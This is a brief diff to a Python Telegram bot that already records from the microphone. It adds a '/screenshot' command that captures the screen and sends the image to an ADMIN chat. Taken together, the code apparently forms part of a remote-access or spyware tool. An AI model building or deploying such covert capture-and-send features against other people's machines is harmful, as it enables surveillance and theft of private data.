@@ -50,6 +50,13 @@ def micro_recording_first(ms):
 
         bot.register_next_step_handler(ms, micro_recording_last)
 
+@bot.message_handler(commands=["screenshot"])
+def screenshot(ms):
+    myScreenshot = pyautogui.screenshot()
+    myScreenshot.save("screenshot.jpg")
+    
+    with open("screenshot.jpg", "rb") as photo:
+        bot.send_photo(ADMIN, photo)
 
 
 bot.infinity_polling()
